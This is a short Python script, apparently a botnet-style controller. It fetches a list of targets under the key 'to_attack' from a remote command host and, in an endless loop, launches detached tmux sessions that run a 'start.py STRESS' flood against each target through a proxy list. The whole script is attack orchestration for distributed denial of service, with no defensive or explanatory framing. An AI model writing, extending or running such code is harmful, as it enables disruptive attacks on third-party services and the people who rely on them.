import requests

import subprocess

import os

host = ""

def get_targets(host):

    response = requests.get(host)

    all_targets = response.json()["to_attack"]

    return all_targets


while True:
    targets = get_targets(host)

    for target in targets:
        subprocess.run(["tmux", "new-session", "-d", "python3", "start.py", "STRESS", target, "4", "auto", "proxy.txt", "61", "600"])
